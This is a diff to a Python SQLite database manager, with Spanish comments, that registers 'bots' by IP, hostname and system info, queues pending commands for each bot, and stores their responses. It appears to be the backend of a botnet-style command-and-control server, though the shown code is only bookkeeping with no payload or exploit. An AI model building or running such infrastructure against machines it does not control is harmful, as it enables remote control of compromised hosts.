@@ -38,76 +38,56 @@ class DatabaseManager:
         os.makedirs(os.path.dirname(self.db_path), exist_ok=True)
 
     def _init_database(self):
+        """Inicializa o actualiza el esquema de la base de datos."""
         try:
-            with sqlite3.connect(self.db_path) as conn:
-                cursor = conn.cursor()
-
-                # Tabla principal de bots
-                cursor.execute('''
-                CREATE TABLE IF NOT EXISTS bots (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    unique_id TEXT UNIQUE,
-                    ip_address TEXT,
-                    system_info TEXT,
-                    first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                    is_active BOOLEAN DEFAULT 1,
-                    metadata TEXT
-                )''')
-
-                # Tabla de comandos y respuestas
-                cursor.execute('''
-                CREATE TABLE IF NOT EXISTS commands (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    bot_id INTEGER,
-                    command TEXT,
-                    response TEXT,
-                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                    success BOOLEAN,
-                    FOREIGN KEY (bot_id) REFERENCES bots(id)
-                )''')
-
-                # Tabla de estadísticas
-                cursor.execute('''
-                CREATE TABLE IF NOT EXISTS stats (
-                    id INTEGER PRIMARY KEY AUTOINCREMENT,
-                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
-                    type TEXT,
-                    value TEXT,
-                    bot_id INTEGER,
-                    FOREIGN KEY (bot_id) REFERENCES bots(id)
-                )''')
-
-                # Índices para mejorar rendimiento
-                cursor.execute('CREATE INDEX IF NOT EXISTS idx_bots_unique_id ON bots(unique_id)')
-                cursor.execute('CREATE INDEX IF NOT EXISTS idx_commands_bot_id ON commands(bot_id)')
-                cursor.execute('CREATE INDEX IF NOT EXISTS idx_stats_bot_id ON stats(bot_id)')
-                
-                conn.commit()
+            # Importar y llamar a la función de inicialización
+            from bbdd.init_db import init_databases
+            init_databases(self.db_path)
         except Exception as e:
             logging.error(f"Error inicializando base de datos: {e}")
             raise
 
-    def register_bot(self, unique_id: str, ip_address: str, system_info: Dict) -> int:
-        """Registra o actualiza un bot en la base de datos."""
+    def register_bot(self, unique_id: str, ip_address: str, system_info: Dict = None, hostname: str = None, additional_info: Dict = None) -> int:
+        """
+        Registra o actualiza un bot en la base de datos.
+        
+        Args:
+            unique_id: Identificador único del bot
+            ip_address: Dirección IP del bot
+            system_info: Información del sistema (SO, versión, etc)
+            hostname: Nombre del host
+            additional_info: Información adicional opcional
+        
+        Returns:
+            ID del bot en la base de datos
+        """
         try:
             with sqlite3.connect(self.db_path) as conn:
                 cursor = conn.cursor()
                 now = datetime.now().isoformat()
+
+                # Si system_info es string, convertir a dict
+                if isinstance(system_info, str):
+                    system_info = {"os": system_info}
+                
+                # Combinar system_info y additional_info
+                full_info = {**(system_info or {})}
+                if additional_info:
+                    full_info.update(additional_info)
 
                 # Intentar actualizar primero
                 cursor.execute('''
                 UPDATE bots 
                 SET ip_address = ?, system_info = ?, last_seen = ?, is_active = 1
                 WHERE unique_id = ?
-                ''', (ip_address, json.dumps(system_info), now, unique_id))
+                ''', (ip_address, json.dumps(full_info), now, unique_id))
 
                 # Si no existe, insertar
                 if cursor.rowcount == 0:
                     cursor.execute('''
                     INSERT INTO bots (unique_id, ip_address, system_info, first_seen, last_seen)
                     VALUES (?, ?, ?, ?, ?)
-                    ''', (unique_id, ip_address, json.dumps(system_info), now, now))
+                    ''', (unique_id, ip_address, json.dumps(full_info), now, now))
 
                 conn.commit()
                 return cursor.lastrowid
@@ -192,3 +172,75 @@ class DatabaseManager:
         except Exception as e:
             logging.error(f"Error añadiendo estadística: {e}")
             raise
+
+    def get_pending_commands(self, bot_id: int) -> List[Dict[str, Any]]:
+        """Obtiene los comandos pendientes para un bot."""
+        try:
+            with sqlite3.connect(self.db_path) as conn:
+                conn.row_factory = sqlite3.Row
+                cursor = conn.cursor()
+                
+                cursor.execute("""
+                    SELECT id, command FROM commands
+                    WHERE bot_id = ? AND executed = 0
+                    ORDER BY timestamp ASC
+                """, (bot_id,))
+                
+                return [dict(row) for row in cursor.fetchall()]
+                
+        except Exception as e:
+            logging.error(f"Error obteniendo comandos pendientes: {e}")
+            return []
+
+    def store_response(self, bot_id: int, command: str, response: str) -> bool:
+        """Almacena la respuesta de un comando."""
+        try:
+            with sqlite3.connect(self.db_path) as conn:
+                cursor = conn.cursor()
+                
+                cursor.execute("""
+                    INSERT INTO commands (bot_id, command, response, executed)
+                    VALUES (?, ?, ?, 1)
+                """, (bot_id, command, response))
+                
+                return True
+                
+        except Exception as e:
+            logging.error(f"Error almacenando respuesta: {e}")
+            return False
+
+    def mark_command_executed(self, command_id: int) -> bool:
+        """Marca un comando como ejecutado."""
+        try:
+            with sqlite3.connect(self.db_path) as conn:
+                cursor = conn.cursor()
+                
+                cursor.execute("""
+                    UPDATE commands
+                    SET executed = 1
+                    WHERE id = ?
+                """, (command_id,))
+                
+                return True
+                
+        except Exception as e:
+            logging.error(f"Error marcando comando como ejecutado: {e}")
+            return False
+
+    def mark_bot_inactive(self, bot_id: int) -> bool:
+        """Marca un bot como inactivo."""
+        try:
+            with sqlite3.connect(self.db_path) as conn:
+                cursor = conn.cursor()
+                
+                cursor.execute("""
+                    UPDATE bots
+                    SET is_active = 0
+                    WHERE id = ?
+                """, (bot_id,))
+                
+                return True
+                
+        except Exception as e:
+            logging.error(f"Error marcando bot como inactivo: {e}")
+            return False
